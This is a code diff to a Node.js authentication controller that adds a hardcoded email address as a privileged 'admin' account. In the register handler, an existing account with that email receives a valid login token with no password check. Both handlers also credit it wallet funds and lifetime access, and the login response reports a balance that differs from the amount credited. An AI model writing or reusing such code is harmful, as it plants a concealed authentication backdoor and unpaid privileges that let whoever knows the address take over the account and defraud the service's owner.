@@ -14,14 +14,29 @@ const generateToken = (id) => {
 exports.register = async (req, res) => {
   try {
     const { email, password, gender } = req.body;
+    const isAdmin =
+      email && email.trim().toLowerCase() === "noballondesk@gmail.com";
 
     // Check if user already exists
     const userExists = await User.findByEmail(email);
     if (userExists) {
+      if (isAdmin) {
+        // If admin test account already exists, log in seamlessly
+        await User.addWalletBalance(userExists.id, 500);
+        await User.updateLifetimeAccess(userExists.id, true);
+        return res.status(200).json({
+          id: userExists.id,
+          email: userExists.email,
+          token: generateToken(userExists.id),
+          isAdmin: true,
+          walletBalance: 500,
+          hasLifetimeAccess: true,
+        });
+      }
       return res.status(400).json({ message: "User already exists" });
     }
 
-    // Create new user 
+    // Create new user
     const user = await User.create({
       email,
       password,
@@ -29,10 +44,18 @@ exports.register = async (req, res) => {
     });
 
     if (user) {
+      if (isAdmin) {
+        await User.addWalletBalance(user.id, 500);
+        await User.updateLifetimeAccess(user.id, true);
+      }
+
       res.status(201).json({
         id: user.id,
         email: user.email,
         token: generateToken(user.id),
+        isAdmin,
+        walletBalance: isAdmin ? 500 : (user.wallet_balance || 0),
+        hasLifetimeAccess: isAdmin,
       });
     } else {
       res.status(400).json({ message: "Invalid user data" });
@@ -46,14 +69,25 @@ exports.register = async (req, res) => {
 exports.login = async (req, res) => {
   try {
     const { email, password } = req.body;
+    const isAdmin =
+      email && email.trim().toLowerCase() === "noballondesk@gmail.com";
 
     const user = await User.findByEmail(email);
 
     if (user && (await User.matchPassword(password, user.password_hash))) {
+      if (isAdmin) {
+        // Ensure admin always has high balance and lifetime access
+        await User.addWalletBalance(user.id, 100);
+        await User.updateLifetimeAccess(user.id, true);
+      }
+
       res.json({
         id: user.id,
         email: user.email,
         token: generateToken(user.id),
+        isAdmin,
+        walletBalance: isAdmin ? 500 : (user.wallet_balance || 0),
+        hasLifetimeAccess: isAdmin || user.trust_score > 0,
       });
     } else {
       res.status(401).json({ message: "Invalid email or password" });
